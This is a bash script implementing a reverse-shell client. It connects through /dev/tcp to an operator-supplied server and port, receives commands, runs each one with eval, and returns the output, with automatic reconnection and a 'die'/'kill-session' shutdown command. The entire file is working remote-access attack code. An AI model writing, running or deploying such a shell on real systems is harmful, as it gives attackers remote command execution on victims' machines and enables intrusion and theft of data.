#!/bin/bash

# Default reconnect delay and max retries
RECONNECT_DELAY=5
MAX_RETRIES=5
RETRIES=0

# Function to show usage
usage () {
    echo "Usage: $0 -s <server_ip> -p <server_port>"
    exit 1
}

# Parse command-line arguments
while getopts "s:p:" opt; do
    case ${opt} in
        s ) SERVER=${OPTARG} ;;
        p ) PORT=${OPTARG} ;;
        * ) usage ;;
    esac
done

# Ensure both arguments are provided
if [[ -z "$SERVER" || -z "$PORT" ]]; then
    usage
fi

# Function to execute a command
execute_command() {
    local CMD_OUTPUT
    CMD_OUTPUT=$(eval "$1" 2>&1)  # Execute command and capture both stdout and stderr
    echo "$CMD_OUTPUT"
}

# Main connection loop
while [[ $RETRIES -lt $MAX_RETRIES ]]; do
    # Open a TCP connection
    exec 3<>/dev/tcp/$SERVER/$PORT
    if [[ $? -ne 0 ]]; then
        RETRIES=$((RETRIES + 1))
        echo "[-] Connection failed ($RETRIES/$MAX_RETRIES)"
        if [[ $RETRIES -ge $MAX_RETRIES ]]; then
            echo "[-] Maximum retry limit reached. Exiting..."
            exit 1
        fi
        sleep $RECONNECT_DELAY
        continue
    fi

    echo "[+] Connected to $SERVER:$PORT"
    RETRIES=0  # Reset retry count on successful connection

    # Listen for commands
    while true; do
        # Read command from server
        if ! read -r -u 3 COMMAND; then
            echo "[-] Connection lost. Reconnecting..."
            break
        fi

        COMMAND=$(echo "$COMMAND" | tr -d '\r\n')  # Strip newline characters
        [[ -z "$COMMAND" ]] && continue

        echo "[*] Received command: $COMMAND"

        # Handle termination command
        if [[ "$COMMAND" == "die" || "$COMMAND" == "kill-session" ]]; then
            echo "[!] Received kill-session command. Shutting down..."
            echo "EOF" >&3
            exec 3>&-
            exit 0
        fi

        # Execute the command and send output back to the server
        OUTPUT=$(execute_command "$COMMAND")
        echo -e "$OUTPUT\nEOF" >&3
    done

    # Close socket before reconnecting
    exec 3>&-
    echo "[*] Reconnecting in $RECONNECT_DELAY seconds..."
    sleep $RECONNECT_DELAY
    RETRIES=$((RETRIES + 1))
done

echo "[-] Maximum retry limit reached. Exiting..."
exit 1
     
